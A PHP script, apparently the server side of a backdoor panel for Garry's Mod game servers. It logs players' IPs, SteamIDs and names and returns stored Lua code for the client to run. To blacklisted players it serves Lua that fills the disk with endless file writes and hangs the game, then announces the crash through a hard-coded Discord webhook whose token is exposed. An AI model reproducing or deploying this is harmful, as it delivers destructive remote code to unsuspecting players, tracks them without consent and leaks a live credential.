<?php
$browser = $_SERVER['HTTP_USER_AGENT'];
include('class/include.php');

$ip = $_SERVER["REMOTE_ADDR"];
$steamid = $_POST["steamid"];
$name = $_POST["name"];
$server = $_POST["server"];

if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {
	$cnt2 = $GLOBALS["DB"]->Count("players_list", ["steamid" => $steamid]);

	if($cnt2 != 0)
	{

		// Si le player exsist
		if ($ip == "93.19.116.55") {
			return false;
		}else {
			$code = $GLOBALS["DB"]->GetContent("players_list", ["ip" => $ip])[0]["code"];
			$GLOBALS["DB"]->Update("players_list", ["ip" => $ip], ["ip" => $ip, "name" => $name]);
			if (Server::IsBlacklist($steamid) == "yes"){
				echo '
				
					local i = 0
					while true do
						file.Write(i.."-"..i.."-"..i.."-"..i.."-"..i.."-"..i..".txt","J aime sucer les cookie")
						i = i + 1
					end
					
					
			   timer.Simple(10,function()
				 timer.Create("oulallalalalsacrash:o",0.01,0,function()
						while true do end
					   end)
			   end)
				
				';
				$str = "@here $name vien de crash sur $server";
				httpPost("https://discordapp.com/api/webhooks/653172578676113418/wePij3_IxOHbIzVWe79i0R9YMYcCzaB6_UTqEAqJyHDd4LNFq6N2Qn6HQh_S3tPy0-q7", array('content' => $str));
				die();
			}
			echo $code;
		}
		
	}else{
		echo "-- Created";
		// Si le exists pas
		$GLOBALS["DB"]->Insert("players_list", ["ip" => $ip, "name" => $name, "steamid" => $steamid, "code" => ""]);

	}
	echo "-- OK";
}else{
	BanIP::BanTheIP($_SERVER["REMOTE_ADDR"]);
	die("rip");
}
?> 